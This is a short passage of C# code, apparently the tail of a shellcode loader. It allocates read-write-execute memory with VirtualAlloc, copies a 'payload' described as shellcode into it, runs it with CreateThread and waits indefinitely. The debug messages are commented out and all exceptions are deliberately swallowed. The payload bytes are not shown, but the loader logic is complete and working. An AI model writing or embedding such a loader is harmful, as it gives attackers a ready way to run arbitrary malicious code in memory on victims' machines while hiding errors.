                //OutputDebugString("Allocating RWX Memory...");
                IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);

                //OutputDebugString("Copying Shellcode to RWX Memory ...");
                Marshal.Copy(payload, 0, ptr, payload.Length);
                IntPtr threadId = IntPtr.Zero;

                //OutputDebugString("Executing Shellcode...");
                CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, out threadId);

                //OutputDebugString("Going to sleep...");
                WaitForSingleObject(threadId, 0xFFFFFFFF);
            }
            catch (Exception ex)
            {
                //OutputDebugString(string.Format("Exception: {}", ex.ToString()));
                // na, na, na, na, na, na, na, bam! bam!
                // just ignore any exception!
            }
        }
    }
